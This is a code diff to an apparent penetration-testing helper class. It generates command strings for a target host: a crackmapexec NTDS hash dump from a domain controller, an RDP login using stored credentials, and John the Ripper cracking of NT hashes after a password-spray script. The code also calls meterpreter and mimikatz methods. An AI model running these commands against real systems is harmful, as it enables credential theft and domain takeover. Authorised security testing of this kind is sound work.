@@ -153,7 +153,8 @@ class CreateTests:
         output += self.meterpreter_shell() + self.util.seperator_line()
         output += self.gather_hashes() + self.util.seperator_line()
         output += self.mimikatz() + self.util.seperator_line()
-
+        output += self.rdp() + self.util.seperator_line()
+        output += self.crackpassword() + self.util.seperator_line()
             
         self.save_results(output, './reports', str(self.host_ip) + ".txt")
 
@@ -191,16 +192,38 @@ class CreateTests:
 
         #output = self.util.execute_command(cmd)
         return cmd
+    
     def gather_hashes(self):
         """
         Gather Hashes
         """
-        cmd = 'crackmapexec smb {0} -u {1} -p "'"{2}"'" —ntds drsuapi -d {3}\n'.format(self.host_ip, self.username, self.password, self.domain)
-        cmd += '### cd ~/.cme/logs -- output of hash dump goes here\n'
+        cmd = 'crackmapexec smb {0} -u {1} -p "'"{2}"'" --ntds drsuapi -d {3}\n'.format(self.host_ip, self.username, self.password, self.domain)
+        cmd += 'cd ~/.cme/logs #-- output of hash dump goes here\n'
 
         #output = self.util.execute_command(cmd)
         return cmd    
     
+    def rdp(self):
+        """
+        RDP Command
+        """
+        cmd = 'NOTE: you have to run this in Powershell, not linux bash!\n'
+        cmd +='cmdkey /generic:{0} /user:{1} /pass:{2}\n'.format(self.host_ip, self.username, self.password)
+        cmd +='mstsc /v:{0}\n'.format(self.host_ip)
+        cmd +='cmdkey /delete:TERMSRV/{0}\n'.format(self.host_ip)
+
+        return cmd
+
+    def crackpassword(self):
+        """
+        John Cracking Password Command (assumes ~/words/passwords.txt dictionary)
+        """
+        cmd ='cd ~/words\n'
+        cmd += './spray.sh -passupdate passwords.txt <COMPANY>\n'
+        cmd += 'john --wordlist=passwords.txt hashes.txt --format=NT --rules=WordList\n'
+        cmd += 'john --show hashes.txt --format=NT > cracked.txt\n'
+        
+        return cmd 
     def save_results(self, results, folder_name, file_name):
         """
         Save to a file
